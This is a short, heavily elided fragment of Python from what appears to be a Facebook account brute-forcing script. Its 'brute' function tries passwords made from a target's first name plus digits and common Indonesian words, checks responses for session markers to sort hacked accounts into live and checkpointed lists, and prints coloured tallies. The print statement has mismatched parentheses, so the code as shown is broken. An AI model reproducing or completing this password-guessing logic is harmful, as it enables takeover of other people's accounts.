...
def brute(tar):
	try:
		...
		fin.append(fn)
		for first in [fn+"123",fn+"12","sayang","bangsat","anjing",fn+"12345"]:
			...
			if "save-device" in ro or "m_sess" in ro:
				...
				crsh.append(tar)
				break
		print(r+"\r\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] = %s"%h+str(len(live)))+y+" | \x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] = %s"%h+str(len(die))+g+" | [[ERROR]] = %s"%h+str(len(crsh)),;sys.stdout.flush()
	except KeyboardInterrupt:
